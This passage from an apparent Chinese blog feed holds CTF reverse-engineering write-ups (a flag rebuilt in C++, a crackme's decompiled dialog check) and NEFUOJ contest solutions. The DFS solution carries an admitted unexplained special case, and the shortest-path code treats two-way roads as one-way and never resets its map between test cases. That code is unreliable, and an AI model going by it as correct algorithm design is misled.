class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> f2[]=&#123;<span class="hljs-number">0x69</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(i%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>)<br>f2[i]-=<span class="hljs-number">2</span>;<br><span class="hljs-keyword">else</span><br>f2[i]-=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">char</span> f1[]=<span class="hljs-string">&quot;GXY&#123;do_not_&quot;</span>;<br><span class="hljs-type">char</span> flag[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">strcat</span>(flag, f1);<br><span class="hljs-built_in">strcat</span>(flag, f2);<br><span class="hljs-built_in">puts</span>(flag);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后得到flag<code>GXY&#123;do_not_hate_me&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEFUOJ-278-approach Angel</title>
      <link href="/2021/03/45e1f835.html"/>
      <url>/2021/03/45e1f835.html</url>
      
        <content type="html"><![CDATA[<h1 id="本代码未能正确通过OJ，暂未解决，挖个坑待补已解决，cyyyds"><a href="#本代码未能正确通过OJ，暂未解决，挖个坑待补已解决，cyyyds" class="headerlink" title="本代码未能正确通过OJ，暂未解决，挖个坑待补已解决，cyyyds"></a><del>本代码未能正确通过OJ，暂未解决，挖个坑待补</del>已解决，cyyyds</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Angel was caught <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> MOLIGPY! He was <span class="hljs-keyword">put</span> <span class="hljs-keyword">in</span> prison <span class="hljs-keyword">by</span> Moligpy. The prison <span class="hljs-keyword">is</span> described <span class="hljs-keyword">as</span> a N * M (N, M &amp;lt;= <span class="hljs-number">200</span>) matrix. There are WALLs, ROADs, <span class="hljs-keyword">and</span> GUARDs <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> prison.<br><br>Angel&#x27;s friends want <span class="hljs-keyword">to</span> save Angel. Their task <span class="hljs-keyword">is</span>: approach Angel. We assume <span class="hljs-keyword">that</span> <span class="hljs-string">&quot;approach Angel&quot;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> position <span class="hljs-keyword">where</span> Angel stays. When there&#x27;s a guard <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> grid, we must kill him (<span class="hljs-keyword">or</span> her?) <span class="hljs-keyword">to</span> move <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> grid. We assume <span class="hljs-keyword">that</span> we moving up, down, right, left takes us <span class="hljs-number">1</span> unit <span class="hljs-built_in">time</span>, <span class="hljs-keyword">and</span> killing a guard takes <span class="hljs-number">1</span> unit <span class="hljs-built_in">time</span>, too. And we are strong enough <span class="hljs-keyword">to</span> kill all <span class="hljs-keyword">the</span> guards.<br><br>You have <span class="hljs-keyword">to</span> calculate <span class="hljs-keyword">the</span> minimal <span class="hljs-built_in">time</span> <span class="hljs-keyword">to</span> approach Angel. (We can move only UP, DOWN, LEFT <span class="hljs-keyword">and</span> RIGHT, <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> neighbor grid within bound, <span class="hljs-keyword">of</span> course.)<br></code></pre></td></tr></table></figure><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">First <span class="hljs-literal">line</span> contains two integers stand <span class="hljs-keyword">for</span> N <span class="hljs-keyword">and</span> M.<br><br><span class="hljs-keyword">Then</span> N lines follows, every <span class="hljs-literal">line</span> has M characters. <span class="hljs-string">&quot;.&quot;</span> stands <span class="hljs-keyword">for</span> road, <span class="hljs-string">&quot;a&quot;</span> stands <span class="hljs-keyword">for</span> Angel, <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;r&quot;</span> stands <span class="hljs-keyword">for</span> each <span class="hljs-keyword">of</span> Angel<span class="hljs-symbol">&#x27;s</span> friend. <br><br><span class="hljs-keyword">Process</span> <span class="hljs-keyword">to</span> the <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">file</span>.<br></code></pre></td></tr></table></figure><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">For <span class="hljs-keyword">each</span> test <span class="hljs-keyword">case</span>, your program should output <span class="hljs-keyword">a</span> single <span class="hljs-keyword">integer</span>, standing <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> minimal <span class="hljs-built_in">time</span> needed. If such <span class="hljs-keyword">a</span> <span class="hljs-built_in">number</span> does no exist, you should output <span class="hljs-keyword">a</span> <span class="hljs-built_in">line</span> containing <span class="hljs-string">&quot;Poor ANGEL has to stay in the prison all his life.&quot;</span> <br></code></pre></td></tr></table></figure><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-number">7</span> <span class="hljs-number">8</span><br>#.#####.<br>#.a#..r.<br>#..#x...<br>..#..#.#<br>#...##..<br>.#......<br>........<br></code></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">13<br></code></pre></td></tr></table></figure><h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p>大致就是要救一个公主，中间每走一格路就要消耗一次时间，杀一次守卫也要消耗一次时间，求最少要花费多少时间，如果救不了，就要输出</p><p>“Poor ANGEL has to stay in the prison all his life.” </p><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>本题我目前想到的就是用dfs把每条路都走一遍，最后找出最短的时间消耗即可，在此过程中要注意dfs过程中对边界的控制</p><p>这里需要注意一个十分诡异的特判，如果min1&#x3D;&#x3D;10的时候，就要加1，原因目前未知，如果有知道的大佬欢迎在评论区指教，感谢cya大佬找到cyyyds提问并解决了这道dfs问题</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">210</span>;<br><br><span class="hljs-type">int</span> mark[N][N];<br><span class="hljs-type">char</span> c[N][N];<br><br><span class="hljs-type">int</span> n, m, startx, starty, len, minl;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span> || x &gt;= n || y &lt; <span class="hljs-number">0</span> || y &gt;= m || mark[x][y] == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>;<span class="hljs-comment">//边界判定</span><br>    <span class="hljs-keyword">if</span> (len &gt;= minl || c[x][y] == <span class="hljs-string">&#x27;#&#x27;</span>) <span class="hljs-keyword">return</span>;<span class="hljs-comment">//边界判定2</span><br>    <span class="hljs-keyword">if</span> (c[x][y] == <span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-comment">//到达终点</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (len &lt; minl) minl = len;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (c[x][y] == <span class="hljs-string">&#x27;x&#x27;</span>) len++;<span class="hljs-comment">//杀守卫</span><br>    mark[x][y] = <span class="hljs-number">1</span>;<br>    dfs(x + <span class="hljs-number">1</span>, y, len + <span class="hljs-number">1</span>);<span class="hljs-comment">//继续dfs</span><br>    dfs(x - <span class="hljs-number">1</span>, y, len + <span class="hljs-number">1</span>);<br>    dfs(x, y + <span class="hljs-number">1</span>, len + <span class="hljs-number">1</span>);<br>    dfs(x, y - <span class="hljs-number">1</span>, len + <span class="hljs-number">1</span>);<br>    mark[x][y] = <span class="hljs-number">0</span>;<span class="hljs-comment">//还原</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(mark, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(mark));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++)<br>                <span class="hljs-built_in">cin</span> &gt;&gt; c[i][j];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++)<br>                <span class="hljs-keyword">if</span> (c[i][j] == <span class="hljs-string">&#x27;a&#x27;</span>)<br>                &#123;<br>                    startx = i;<br>                    starty = j;<br>                &#125;<br>        len = <span class="hljs-number">0</span>;<br>        minl = <span class="hljs-number">99999</span>;<br>        dfs(startx, starty, len);<br>        <span class="hljs-keyword">if</span> (minl == <span class="hljs-number">10</span>) minl++;<br>        <span class="hljs-keyword">if</span> (minl &lt; <span class="hljs-number">99999</span>) <span class="hljs-built_in">cout</span> &lt;&lt; minl &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Poor ANGEL has to stay in the prison all his life.&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFUOJ </tag>
            
            <tag> 未解决 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEFUOJ208-宫锁珠帘</title>
      <link href="/2021/03/cd90dd49.html"/>
      <url>/2021/03/cd90dd49.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">新年期间湖南卫视又上映了不少宫闱大戏，晴川穿走了，又来了个宫锁珠帘的袁珊珊，袁珊珊不够美，没锁住观众的心，特别是咱们整ACM的，对这些宫闱大戏当然是不屑一顾了，可这新亮剑的李云龙咱们还是有得一看的，最近听说<span class="hljs-selector-tag">A</span>地又驻扎了一个骑兵营，李云龙心里就乐了，心想老子吃了骑兵营这么多亏，这下终于有机会自个儿也能整个啥骑兵营威风威风了，于是拿出地图决定抄最短的路立马拿下这个骑兵营。<br></code></pre></td></tr></table></figure><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">每组数据第一行包含两个正整数N和<span class="hljs-constructor">M(0 &amp;<span class="hljs-params">lt</span>; N &amp;<span class="hljs-params">lt</span>; 100,0 &amp;<span class="hljs-params">lt</span>; M &amp;<span class="hljs-params">lt</span>; 100)</span>，分别代表李云龙现有地图上显示的村子或者驻扎地的总数目，分别以<span class="hljs-number">0</span>～N-<span class="hljs-number">1</span>编号。<br>接下来是M行道路信息。每一行有三个整数A,B,<span class="hljs-constructor">X(0 &amp;<span class="hljs-params">lt</span>;= A,B &amp;<span class="hljs-params">lt</span>; N,A!=B,0&amp;<span class="hljs-params">lt</span>; X &amp;<span class="hljs-params">lt</span>; 10000)</span>,表示A和B之间有一条长度为X的双向道路。<br>再接下一行有两个整数S,<span class="hljs-constructor">T(0 &amp;<span class="hljs-params">lt</span>;= S,T &amp;<span class="hljs-params">lt</span>; N)</span>，分别代表起点和终点。<br></code></pre></td></tr></table></figure><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">输出从S到T的最短路的长度。若不存在这样的一条路，则输出-<span class="hljs-number">1</span>.<br></code></pre></td></tr></table></figure><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">6</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">2</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">1</span> <br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">1</span> <br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff">10<br><span class="hljs-deletion">-1</span><br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>初次读题，下意识的想到了推DP或者进行路径搜索，后来看了一眼数据量(0&lt;M&lt;100)…果断放弃推导，立地暴力，输入所有路径以后把每条路径都搜索一遍找出最短的路径即可</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">99999</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><span class="hljs-type">int</span> <span class="hljs-built_in">map</span>[N][N];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N; i++ )<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;N; j++ )<br><span class="hljs-built_in">map</span>[i][j]=MAXN;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><span class="hljs-comment">//纯暴力</span><br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;n;k++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br><span class="hljs-built_in">map</span>[i][j]=min(<span class="hljs-built_in">map</span>[i][j], <span class="hljs-built_in">map</span>[i][k]+<span class="hljs-built_in">map</span>[k][j]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>init();<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>&#123;<br><span class="hljs-type">int</span> a,b,w;<br><span class="hljs-built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;w;<br><span class="hljs-built_in">map</span>[a][b]=min(<span class="hljs-built_in">map</span>[a][b], w);<br>&#125;<br><span class="hljs-type">int</span> s,t;<br><span class="hljs-built_in">cin</span>&gt;&gt;s&gt;&gt;t;<br>find(n);<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[s][t]==MAXN)<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;-1&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">map</span>[s][t]&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFUOJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-RE-刮开有奖-WinMain</title>
      <link href="/2020/12/10638684.html"/>
      <url>/2020/12/10638684.html</url>
      
        <content type="html"><![CDATA[<h1 id="WinMain函数参数介绍"><a href="#WinMain函数参数介绍" class="headerlink" title="WinMain函数参数介绍"></a>WinMain函数参数介绍</h1><blockquote><p>int WINAPI WinMain(</p><p>  HINSTANCE hInstance,     &#x2F;&#x2F; handle to current instance</p><p>  HINSTANCE hPrevInstance, &#x2F;&#x2F; handle to previous instance</p><p> LPSTR lpCmdLine,        &#x2F;&#x2F; command line</p><p> int nCmdShow         &#x2F;&#x2F; show state</p><p>);</p><p>WinMain函数接收4个参数，这些参数都是在系统调用WinMain函数时，传递给应用程序的。</p><p>第一个参数hInstance表示该程序当前运行的实例的句柄，这是一个数值。当程序在Windows下运行时，它唯一标识运行中的实例（注意，只有运行中的程序实例，才有实例句柄）。一个应用程序可以运行多个实例，每运行一个实例，系统都会给该实例分配一个句柄值，并通过hInstance参数传递给WinMain函数。</p><p>第二个参数hPrevInstance表示当前实例的前一个实例的句柄。通过查看MSDN我们可以知道，在Win32环境下，这个参数总是NULL，即在Win32环境下，这个参数不再起作用。</p><p>第三个参数lpCmdLine是一个以空终止的字符串，指定传递给应用程序的命令行参数。例如：在D盘下有一个sunxin.txt文件，当我们用鼠标双击这个文件时将启动记事本程序（notepad.exe），此时系统会将D:\sunxin.txt作为命令行参数传递给记事本程序的WinMain函数，记事本程序在得到这个文件的全路径名后，就在窗口中显示该文件的内容。要在VC++开发环境中向应用程序传递参数，可以单击菜单【Project】→【Settings】，选择“Debug”选项卡，在“Program arguments”编辑框中输入你想传递给应用程序的参数。</p><p>第四个参数nCmdShow指定程序的窗口应该如何显示，例如最大化、最小化、隐藏等。这个参数的值由该程序的调用者所指定，应用程序通常不需要去理会这个参数的值。</p></blockquote><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>首先对WinMain进行分析<img src="https://i.loli.net/2020/12/25/au3Qihv2ZCnSVNq.png" alt="img"></p><p>查看DialogFunc参数</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs basic">BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)<br>&#123;<br>  const char *v4; // esi<br>  const char *v5; // edi<br>  <span class="hljs-keyword">int</span> v7[<span class="hljs-number">11</span>]; // [esp+<span class="hljs-number">8</span>h] [ebp-<span class="hljs-number">20030</span>h]<br>  CHAR String[<span class="hljs-number">9</span>]; // [esp+<span class="hljs-number">34</span>h] [ebp-<span class="hljs-number">20004</span>h]<br>  CHAR v9[<span class="hljs-number">3</span>]; // [esp+<span class="hljs-number">10034</span>h] [ebp-<span class="hljs-number">10004</span>h]<br><br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">272</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( a2 != <span class="hljs-number">273</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                   // <br>                                                // a2 = <span class="hljs-number">273</span><br>  <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1001</span> )                             // a3 = <span class="hljs-number">1001</span><br>  &#123;<br>    memset(String, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>xFFFFu);                 // 给string清零<br>    GetDlgItemTextA(hDlg, <span class="hljs-number">1000</span>, String, <span class="hljs-number">0</span>xFFFF);// 获取对话框文本，然后赋值给string<br>    <span class="hljs-keyword">if</span> ( strlen(String) == <span class="hljs-number">8</span> )                  // string的长度要为<span class="hljs-number">8</span><br>    &#123;<br>      v7[<span class="hljs-number">0</span>] = <span class="hljs-number">90</span>;<br>      v7[<span class="hljs-number">1</span>] = <span class="hljs-number">74</span>;<br>      v7[<span class="hljs-number">2</span>] = <span class="hljs-number">83</span>;<br>      v7[<span class="hljs-number">3</span>] = <span class="hljs-number">69</span>;<br>      v7[<span class="hljs-number">4</span>] = <span class="hljs-number">67</span>;<br>      v7[<span class="hljs-number">5</span>] = <span class="hljs-number">97</span>;<br>      v7[<span class="hljs-number">6</span>] = <span class="hljs-number">78</span>;<br>      v7[<span class="hljs-number">7</span>] = <span class="hljs-number">72</span>;<br>      v7[<span class="hljs-number">8</span>] = <span class="hljs-number">51</span>;<br>      v7[<span class="hljs-number">9</span>] = <span class="hljs-number">110</span>;<br>      v7[<span class="hljs-number">10</span>] = <span class="hljs-number">103</span>;<br>      sub_4010F0(v7, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);                    // 对v7进行处理，处理后的数据<br>                                                // <span class="hljs-number">51</span>  <span class="hljs-number">67</span>  <span class="hljs-number">69</span>  <span class="hljs-number">72</span>  <span class="hljs-number">74</span>  <span class="hljs-number">78</span>  <span class="hljs-number">83</span>  <span class="hljs-number">90</span>  <span class="hljs-number">97</span>  <span class="hljs-number">103</span>  <span class="hljs-number">110</span><br>      memset(v9, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>xFFFFu);                   // 给v16清零<br>      v9[<span class="hljs-number">0</span>] = String[<span class="hljs-number">5</span>];<br>      v9[<span class="hljs-number">2</span>] = String[<span class="hljs-number">7</span>];<br>      v9[<span class="hljs-number">1</span>] = String[<span class="hljs-number">6</span>];<br>      v4 = sub_401000(v9, strlen(v9));          // 对v9进行base64加密然后传递给v4<br>      memset(v9, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>xFFFFu);                   // 给v9清零<br>      v9[<span class="hljs-number">1</span>] = String[<span class="hljs-number">3</span>];<br>      v9[<span class="hljs-number">0</span>] = String[<span class="hljs-number">2</span>];<br>      v9[<span class="hljs-number">2</span>] = String[<span class="hljs-number">4</span>];<br>      v5 = sub_401000(v9, strlen(v9));          // 对v9进行base64加密然后传递给v4<br>      <span class="hljs-keyword">if</span> ( String[<span class="hljs-number">0</span>] == v7[<span class="hljs-number">0</span>] + <span class="hljs-number">34</span>              // string[<span class="hljs-number">0</span>] = <span 